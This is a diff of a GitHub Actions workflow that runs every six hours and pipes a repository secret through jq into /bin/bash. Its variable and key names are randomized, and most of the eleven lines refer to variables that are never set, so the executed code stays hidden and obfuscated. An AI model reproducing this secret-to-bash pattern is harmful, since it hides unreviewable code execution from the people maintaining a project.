@@ -2,7 +2,7 @@ name: yinxinruizhong
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 1/6 * * *'
+    - cron: '17 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,17 +10,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: yinxinruizhong
         env:
-          c42958: ${{ secrets.c42958 }}
+          ow9983: ${{ secrets.ow9983 }}
         run: |
-          echo $c42958 | jq -r .qcei1 | /bin/bash
-          echo $gxz752 | jq -r .larw7 | /bin/bash
-          echo $cv320 | jq -r .la168 | /bin/bash
-          echo $tfxe779 | jq -r .drmp1133 | /bin/bash
-          echo $weqc29774 | jq -r .nb64 | /bin/bash
-          echo $ljh6615 | jq -r .yiov8 | /bin/bash
-          echo $ipt96 | jq -r .j6 | /bin/bash
-          echo $oo0 | jq -r .yjkuv5 | /bin/bash
-          echo $rmsr41 | jq -r .hv24422 | /bin/bash
-          echo $qe4027 | jq -r .k39401 | /bin/bash
-          echo $vqo58 | jq -r .zmv76 | /bin/bash
+          echo $ow9983 | jq -r .fvl0 | /bin/bash
+          echo $lznh1 | jq -r .h02 | /bin/bash
+          echo $uoxwf1 | jq -r .wqa913 | /bin/bash
+          echo $y09142 | jq -r .nn76 | /bin/bash
+          echo $ei18 | jq -r .hkhsq95203 | /bin/bash
+          echo $er585 | jq -r .xsx8051 | /bin/bash
+          echo $yrx084 | jq -r .q0769 | /bin/bash
+          echo $tkgon221 | jq -r .zl9317 | /bin/bash
+          echo $sie9 | jq -r .zoqb9 | /bin/bash
+          echo $ze514 | jq -r .jyj3 | /bin/bash
+          echo $lleq019 | jq -r .vxyil65 | /bin/bash
 
